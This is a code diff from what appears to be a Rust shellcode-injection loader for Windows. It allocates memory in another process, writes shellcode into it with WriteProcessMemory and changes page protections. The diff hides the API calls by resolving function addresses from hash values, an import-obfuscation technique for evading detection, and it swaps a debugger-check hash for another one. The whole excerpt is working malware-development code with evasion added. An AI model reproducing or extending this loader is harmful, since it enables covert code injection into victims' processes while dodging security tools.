@@ -190,7 +190,7 @@ fn main() {
 
     //getFuncAddressByHash("kernel32", 0xf92f7b);
 
-    println!("{:#x}", getHashFromFunc("IsDebuggerPresent"));
+    println!("{:#x}", getHashFromFunc("WriteProcessMemory"));
 
     let pid = process::id();
 
@@ -213,6 +213,7 @@ fn main() {
             process::exit(-1);
         }
 
+        let XVirtualAllocEx: TVirtualAllocEx = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x4fd152) as *const u32);
         let haddr = VirtualAllocEx(
             hprocess,
             Some(null_mut()),
@@ -221,6 +222,7 @@ fn main() {
             PAGE_READWRITE,
         );
 
+        //println!("{:?}", haddr);
         if haddr.is_null() {
             eprintln!("[!] Failed to Allocate Memory in Target Process.");
             let _ = CloseHandle(hprocess);
@@ -228,16 +230,14 @@ fn main() {
         }
 
         println!("[i] Writing to memory at address {:p}", haddr);
-        WriteProcessMemory(
+
+        let XWriteProcessMemory: TWriteProcessMemory = mem::transmute(getFuncAddressByHash("kernel32.dll", 0xa48f46) as *const u32);
+        XWriteProcessMemory(
             hprocess,
             haddr, 
             shellcode.as_ptr() as _,
             shellcode.len(),
-            None,).unwrap_or_else(|e| {
-                eprintln!("[!] WriteProcessMemory Failed With Error: {}", e);
-                let _ = CloseHandle(hprocess);
-                process::exit(-1);
-            }
+            None,
         );
 
         let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
